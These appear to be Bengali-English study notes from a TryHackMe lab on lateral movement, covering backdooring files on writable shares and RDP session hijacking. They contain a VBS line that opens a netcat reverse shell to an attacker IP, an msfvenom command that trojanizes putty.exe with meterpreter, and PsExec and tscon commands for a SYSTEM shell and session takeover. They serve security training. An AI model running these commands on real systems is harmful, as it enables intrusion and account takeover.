# **Abusing User Behaviour**

## **1. What is Abusing User Behaviour?**

কিছু পরিস্থিতিতে attacker legitimate user-এর actions ব্যবহার করে network-এর অন্য machine-এ access পেতে পারে।

এই section-এ দুটি common technique:

1. Abusing Writable Shares
2. RDP Hijacking

## **2. Abusing Writable Shares**

- Corporate network-এ users দৈনন্দিন কাজের জন্য network shares ব্যবহার করে।
- Share writable হলে attacker সেখানে malicious file রেখে user-কে payload execute করাতে পারে।
- এর মাধ্যমে user-এর workstation-এ access পাওয়া সম্ভব।

### **Shortcut (.lnk) Attack**

- Network share-এ কোনো script বা executable-এর shortcut থাকতে পারে।
- Administrator একটি network share-এ executable রাখে, যাতে users নিজের machine-এ install বা copy না করেই ব্যবহার করতে পারে।
- Attacker-এর share-এ write permission থাকলে executable বা script backdoor করতে পারে।
- User workstation থেকে shortcut open করলে executable server থেকে user's `%temp%` folder-এ copy হয়ে workstation-এ execute হয়।
- তাই payload user's workstation ও logged-in user account-এর context-এ চলে।

### **A. Backdooring .vbs Scripts**

Shared resource যদি VBS script হয়, তাহলে একই share-এ `nc64.exe` রেখে script-এ নিচের code inject করা যায়:

```
CreateObject("WScript.Shell").Run "cmd.exe /c copy /Y \\10.10.28.6\myshare\nc64.exe %tmp% & %tmp%\nc64.exe -e cmd.exe <attacker_ip> 1234", 0, True
```

**কাজ:**

- Share থেকে `nc64.exe` user's `%tmp%` directory-তে copy করে।
- User shared VBS script open করলে reverse shell attacker-এর কাছে পাঠায়।

### **B. Backdooring .exe Files**

- Shared file যদি Windows binary হয়, যেমন `putty.exe`, তাহলে সেটি download করে `msfvenom` দিয়ে backdoor inject করা যায়।
- Original application স্বাভাবিকভাবে কাজ করবে, পাশাপাশি অতিরিক্ত payload silently execute করবে।

**Backdoored putty.exe তৈরি:**

```
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=<attacker_ip> lport=4444 -b "\x00" -f exe -o puttyX.exe
```

- `-x putty.exe` → Original executable ব্যবহার।
- `-k` → Original executable-এর functionality বজায় রাখে।
- `-p` → Meterpreter reverse TCP payload।
- `-o puttyX.exe` → Output file।

এরপর `puttyX.exe`-কে Windows share-এ replace করতে হবে এবং Metasploit-এর `exploit/multi/handler` দিয়ে incoming connection অপেক্ষা করতে হবে।

## **3. RDP Hijacking**

- Administrator RDP দিয়ে machine-এ connect করে শুধু RDP client বন্ধ করলে session server-এ open থাকতে পারে।
- Windows Server 2016 ও তার আগের version-এ SYSTEM privilege থাকলে password ছাড়াই অন্য user's existing RDP session hijack করা সম্ভব।
- Windows Server 2019-এ অন্য user's session-এ connect করতে তার password প্রয়োজন।

### **Step 1: SYSTEM Privilege পাওয়া**

Administrator access থাকলে `PsExec64.exe` দিয়ে SYSTEM shell নেওয়া যায়।

প্রথমে CMD administrator হিসেবে চালাতে হবে।

[Run as administrator](https://cdn-images.tryhackme.com/user-uploads/5ed5961c6276df568891c3ea/room-content/7ba63227fb9d7244d5814b0e4fd57793.png?utm_source=chatgpt.com)

`C:\tools\` থেকে:

```
PsExec64.exe -s cmd.exe
```

### **Step 2: Existing Sessions দেখা**

```
C:\> query user
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>administrator         rdp-tcp#6           2  Active          .  4/1/2022 4:09 AM
 luke                                    3  Disc            .  4/6/2022 6:51 AM
```

- `SESSIONNAME` → Current RDP session name।
- `ID` → Session ID।
- `Active` → User বর্তমানে session ব্যবহার করছে।
- `Disc` → User session disconnect করেছে, কিন্তু session open আছে।

এখানে:

- Administrator-এর session name: `rdp-tcp#6`
- Luke-এর session ID: `3`
- Luke-এর session disconnected।

**Note:** Active session hijack করলে legitimate user session থেকে বের হয়ে যেতে পারে এবং বিষয়টি বুঝতে পারে।

### **Step 3: Session Hijack**

`tscon.exe` ব্যবহার করে session connect করতে হবে।

```
tscon 3 /dest:rdp-tcp#6
```

- `3` → Luke-এর session ID।
- `/dest:rdp-tcp#6` → Administrator-এর current RDP session name।

এতে Luke-এর graphical session Administrator-এর RDP session-এর সঙ্গে connect হবে এবং তার session resume হবে।

**Important:**

- `query session` চালালে `t1_toby.beck` নামে একাধিক session দেখা যেতে পারে।
- এগুলো একই user-এর identical copies।
- যেকোনো একটি hijack করলেই হবে।
- শুধু **Disconnected (**`Disc.`**)** session hijack করবে, যাতে অন্য users-এর কাজে বাধা না পড়ে।

## **Quick Revision**

| Technique       | মূল ধারণা                                                                 |
| --------------- | ------------------------------------------------------------------------- |
| Writable Shares | Writable share-এ malicious script/executable রেখে user দিয়ে execute করানো |
| VBS Backdoor    | VBS script দিয়ে `nc64.exe` copy করে reverse shell                         |
| EXE Backdoor    | `msfvenom` দিয়ে original executable-এ payload inject                      |
| RDP Hijacking   | SYSTEM privilege দিয়ে disconnected RDP session takeover                   |

**মনে রাখবে:**

- Writable Share → User-এর action ব্যবহার করে তার workstation-এ access।
- `.lnk` → Network share-এর executable launch করে।
- `.vbs` → Script backdoor করা যায়।
- `.exe` → `msfvenom` দিয়ে backdoor inject করা যায়।
- `query user` → Existing RDP sessions দেখা।
- `PsExec64.exe -s cmd.exe` → SYSTEM shell।
- `tscon` → RDP session hijack।
